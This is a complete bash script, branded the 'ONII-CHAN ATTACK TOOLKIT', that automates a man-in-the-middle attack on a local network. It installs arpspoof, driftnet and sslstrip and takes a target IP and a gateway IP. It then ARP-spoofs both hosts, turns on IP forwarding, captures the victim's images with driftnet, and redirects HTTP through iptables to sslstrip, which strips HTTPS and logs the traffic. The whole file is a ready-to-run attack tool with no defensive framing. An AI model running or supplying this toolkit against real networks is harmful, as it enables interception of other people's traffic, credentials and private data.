#!/bin/bash

# ----------------- CONFIG & FUNCTIONS -----------------

RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[1;33m"
RESET="\033[0m"

LOG_DIR="./logs/attack_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOG_DIR"

cleanup() {
    echo -e "${RED}\n[!] Cleaning up...${RESET}"
    pkill -f "arpspoof -i $INTERFACE"
    pkill -f "driftnet -i $INTERFACE"
    pkill -f "sslstrip"
    iptables -t nat -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "${GREEN}[*] Cleanup complete. Logs saved in $LOG_DIR${RESET}"
    exit 0
}

trap cleanup INT

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Run this script as root.${RESET}"
        exit 1
    fi
}

install_tool() {
    local tool="$1"
    if command -v "$tool" &>/dev/null; then
        echo -e "${GREEN}[✓] $tool is installed.${RESET}"
    else
        echo -e "${YELLOW}[*] Installing $tool...${RESET}"
        if command -v apt &>/dev/null; then
            sudo apt update && sudo apt install -y "$tool"
        elif command -v pacman &>/dev/null; then
            sudo pacman -Sy --noconfirm "$tool"
        elif command -v yum &>/dev/null; then
            sudo yum install -y "$tool"
        else
            echo -e "${RED}[!] No supported package manager found.${RESET}"
            exit 1
        fi
    fi
}

get_user_input() {
    read -rp "[+] Interface: " INTERFACE
    read -rp "[+] Target IP: " TARGET
    read -rp "[+] Gateway IP: " GATEWAY
}

enable_ip_forwarding() {
    echo 1 > /proc/sys/net/ipv4/ip_forward
}

start_arpspoof() {
    echo -e "${YELLOW}[+] Starting ARP spoofing...${RESET}"
    arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" > "$LOG_DIR/target_to_gateway.log" 2>&1 &
    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" > "$LOG_DIR/gateway_to_target.log" 2>&1 &
}

start_driftnet() {
    echo -e "${YELLOW}[+] Starting Driftnet...${RESET}"
    driftnet -i "$INTERFACE" > "$LOG_DIR/driftnet.log" 2>&1 &
}

start_sslstrip() {
    echo -e "${YELLOW}[+] Redirecting HTTP traffic and starting sslstrip...${RESET}"
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    xterm -hold -e "sslstrip -l 10000 > \"$LOG_DIR/sslstrip.log\" 2>&1" &
}

pause_screen() {
    echo -e "${GREEN}\n[✓] Attack launched. Press Ctrl+C to stop and cleanup.${RESET}"
    sleep infinity
}

# ----------------- SCRIPT START -----------------

check_root
echo -e "\033[1;34m
-------------------------------------------------------
|              ONII-CHAN ATTACK TOOLKIT               |
|    MITM - ARP Spoofing - Driftnet - SSLStrip        |
| @uth0r Astra.X      Thanks to B!n@ry N!5h@n         |
|                  Version 2.0                        |
-------------------------------------------------------
\033[0m"

REQUIRED_TOOLS=("arpspoof" "driftnet" "sslstrip" "xterm")
for tool in "${REQUIRED_TOOLS[@]}"; do
    install_tool "$tool"
done

# Main Menu
PS3=$'\nChoose attack mode: '
options=(
    "ARP Spoofing + Driftnet"
    "ARP Spoofing + SSLStrip"
    "Full Attack (ARP + Driftnet + SSLStrip)"
    "Exit"
)

select opt in "${options[@]}"; do
    case $REPLY in
        1)
            get_user_input
            enable_ip_forwarding
            start_arpspoof
            start_driftnet
            pause_screen
            ;;
        2)
            get_user_input
            enable_ip_forwarding
            start_arpspoof
            start_sslstrip
            pause_screen
            ;;
        3)
            get_user_input
            enable_ip_forwarding
            start_arpspoof
            start_driftnet
            start_sslstrip
            pause_screen
            ;;
        4)
            echo -e "${YELLOW}[*] Exiting...${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option.${RESET}"
            ;;
    esac
done
